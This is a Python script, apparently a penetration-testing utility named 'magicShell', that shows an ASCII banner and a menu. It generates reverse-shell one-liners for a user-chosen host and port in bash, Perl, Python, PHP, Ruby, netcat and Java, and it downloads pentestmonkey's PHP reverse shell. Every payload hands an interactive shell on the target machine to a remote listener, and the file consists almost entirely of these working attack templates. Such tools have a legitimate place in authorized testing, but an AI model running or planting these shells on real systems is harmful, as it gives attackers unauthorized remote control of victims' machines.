#!/usr/bin/python3

#Autor: xaxxjs (https://sergioab7.github.io/)

from colorama import Fore, Style
import os, time, sys 
from time import sleep
import requests 
import signal 

def signal_handler(key,frame):
    print(Fore.YELLOW + "\n[*]" + Fore.RESET + " Saliendo... \n")
    print(Style.RESET_ALL)
    sys.exit(1)

signal=signal.signal(signal.SIGINT,signal_handler)

def banner():
    print("""
                 __.-/|
                 \`o_O'
                  =( )=  +--------+
                    U|   | SHELLS |
          /\  /\   / |   +--------+
         ) /^\) ^\/ _)\     |
         )   /^\/   _) \    |
         )   _ /  / _)  \___|_
     /\  )/\/ ||  | )_)\___,|))    """+Fore.RED + """by"""+Fore.RESET + """: xaxxjs | (https://sergioab7.github.io/)
    <  >      |(,,) )__)    |
     ||      /    \)___)
     | \____(      )___) )____
      \______(_______;;;)__;;;)     
    """)
banner()

def opciones():
    print(Style.DIM + """
\n\t\tSELECT YOUR REVERSE SHELL
\n\t"""+Fore.CYAN+"""[1]"""+Fore.RESET+""" BASH
\t"""+Fore.BLUE+"""[2]"""+Fore.RESET+""" PERL
\t"""+Fore.CYAN+"""[3]"""+Fore.RESET+""" PYTHON
\t"""+Fore.BLUE+"""[4]"""+Fore.RESET+""" PHP
\t"""+Fore.CYAN+"""[5]"""+Fore.RESET+""" RUBY
\t"""+Fore.BLUE+"""[6]"""+Fore.RESET+""" NETCAT
\t"""+Fore.CYAN+"""[7]"""+Fore.RESET+""" NETCAT v2
\t"""+Fore.BLUE+"""[8]"""+Fore.RESET+""" JAVA
\t"""+Fore.CYAN+"""[9]"""+Fore.RESET+""" DOWNLOAD PHP-REVERSE-SHELL 

    """ + Style.RESET_ALL)

opciones()


def rev_bash():
   
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Select HOST: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Select PORT: ")
    bash_shell=""" bash -i >& /dev/tcp/%s/%s 0>&1 """%(lhost,lport)
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")

def rev_perl():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Select HOST: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Select PORT: ")
    bash_shell=""" perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' """%(lhost,lport)
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")

def rev_python():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Select HOST: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Select PORT: ")
    bash_shell=""" python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'  """%(lhost,lport)
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")

def rev_php():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Select HOST: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Select PORT: ")
    bash_shell=""" php -r '$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");' """%(lhost,lport)
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] "+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ") 

def rev_ruby():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Select HOST: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Select PORT: ")
    simbolo="%d"
    bash_shell=""" ruby -rsocket -e'f=TCPSocket.open("%s",%s).to_i;exec sprintf("/bin/sh -i <&%s >&%s 2>&%s",f,f,f)' """%(lhost,lport,simbolo,simbolo,simbolo)
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] "+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ") 

def rev_netcat():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Select HOST: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Select PORT: ")
    bash_shell=""" nc -e /bin/sh %s %s """%(lhost,lport)
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] "+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ") 

def rev_netcat2():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Select HOST: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Select PORT: ")
    bash_shell=""" rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s   >/tmp/f """%(lhost,lport)
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] "+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ") 

def rev_java():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Select HOST: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Select PORT: ")
    bash_shell="""\nr = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor() """%(lhost,lport)
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] "+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ") 

def rev_php_grande():
     url=" http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz "
     archivo=requests.get(url)
     open("php-reverse-shell.tar.gz", "wb").write(archivo.content)
     print(Fore.YELLOW + "[+]"+Fore.RESET+ " Download successful! ")


while True:
    comando=input(Fore.GREEN + "magicShell$~" + Fore.RESET)
    if(comando=="1"):
        rev_bash()
    elif(comando=="2"):
        rev_perl()
    elif(comando=="3"):
        rev_python()
    elif(comando=="4"):
        rev_php()
    elif(comando=="5"):
        rev_ruby()
    elif(comando=="6"):
        rev_netcat()
    elif(comando=="7"):
        rev_netcat2()
    elif(comando=="8"):
        rev_java()
    elif(comando=="9"):
        rev_php_grande()
    else:
        print(Fore.RED + "[-]"+Fore.RESET+ " Command not found!") 